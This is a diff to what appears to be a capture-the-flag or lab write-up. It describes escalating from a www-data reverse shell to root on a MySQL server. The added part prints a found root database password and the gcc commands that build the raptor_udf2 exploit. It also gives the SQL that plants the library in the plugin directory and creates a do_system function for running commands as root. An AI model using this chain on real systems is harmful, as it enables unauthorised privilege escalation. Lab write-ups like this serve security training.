@@ -105,3 +105,70 @@ Boom I'm in got a reverse shell as user www-data.
 ![image](https://user-images.githubusercontent.com/87468669/209786068-eff48675-a09e-4efa-9002-70728d64814f.png)
 
 stabilize the shell and esc privs...
+
+![image](https://user-images.githubusercontent.com/87468669/209823977-a637ede7-9c2a-43ae-b7f3-90b047c4e0f8.png)
+
+found a config.php file in the /var/www directory, reading the content of it looks like a mysql server logs. First thing i did was check whether MySQL is running with root privileges, which can be done with the following command:
+
+```
+ps aux | grep mysql
+```
+
+![image](https://user-images.githubusercontent.com/87468669/209824296-5945dcd7-a9aa-4bb9-94b3-f59ea3f2ec25.png)
+
+Next, finding the running MySQL version will reveal whether it may be affected by a privilege escalation vulnerability:
+
+```
+mysql -V
+mysql -u root -p -e 'select @@version`
+```
+
+![image](https://user-images.githubusercontent.com/87468669/209825660-2901fe9a-ed4e-4724-967b-233276178d2f.png)
+
+Got the version, This version of MySQL is affected by a vulnerability that allows users to run user-defined functions to execute commands in the context of MySQL, which in this case is root. 
+
+![image](https://user-images.githubusercontent.com/87468669/209825720-cdf5a41b-251f-42d1-bb9b-572d8357c4d2.png)
+
+Next login with the creds that was found in config.php `root:EscalateRaftHubris123`
+
+![image](https://user-images.githubusercontent.com/87468669/209826294-91b3a9fd-164b-49c0-8512-903214c56891.png)
+
+searched for exploit on searchsploit. next is to compile the exploit.
+
+```
+gcc -g -c 1518.c -o raptor_udf2.o -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+![image](https://user-images.githubusercontent.com/87468669/209826556-2dc63fab-8444-4570-a035-83cc1d9f1c57.png)
+
+Now we've compiled the exploit, send the compiled exploit to target.
+
+![image](https://user-images.githubusercontent.com/87468669/209826684-8a798083-ce4c-49b7-853c-b9b67c180af9.png)
+
+Remember it's ftp we are using to transfer files. Now from within MySQL, the following commands can be used to create a new table containing the path to the shared object, copying the same file under /usr/lib/mysql/plugin and creating a “do_system” function that will
+
+```
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/var/www/html/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+```
+
+![image](https://user-images.githubusercontent.com/87468669/209827333-4ebbe7c6-056c-48eb-aca3-b18fd6165de3.png)
+
+If the plugin directory used in the MySQL instance is not the default one, the following command can be used to display the current plugin directory, from within MySQL:
+
+```
+show variables like '%plugin%';
+```
+
+![image](https://user-images.githubusercontent.com/87468669/209827578-85c08937-4bed-4bd7-b0ec-c25a510064de.png)
+
+Now getting root... The “select do_system” statement can then be used to execute commands as root:
+
+```
+select do_system('<command>');
+```
+
